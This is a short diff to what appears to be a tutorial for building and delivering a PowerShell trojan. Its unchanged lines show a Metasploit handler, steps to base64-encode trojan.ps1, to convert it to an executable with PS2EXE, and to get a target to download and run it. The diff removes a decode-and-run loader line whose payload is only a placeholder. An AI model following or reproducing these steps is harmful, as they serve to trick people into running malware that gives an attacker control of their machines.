@@ -25,8 +25,7 @@ msf exploit(handler) > exploit <br>
 6. **Base64 encode the trojan.ps1 script.** <br>
 trojan.ps1 <br>
 7. **Convert our encoded trojan.ps1 into .exe using PS2EXE.** <br>
-$A =[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("INSERT_BASE64_ENCODED_TROJAN"))
-powershell -noprofile $A
+encoded_trojan.ps1
 8. **Get target to download and run trojan.exe(Powershell)**
 
 # Demonstration Video
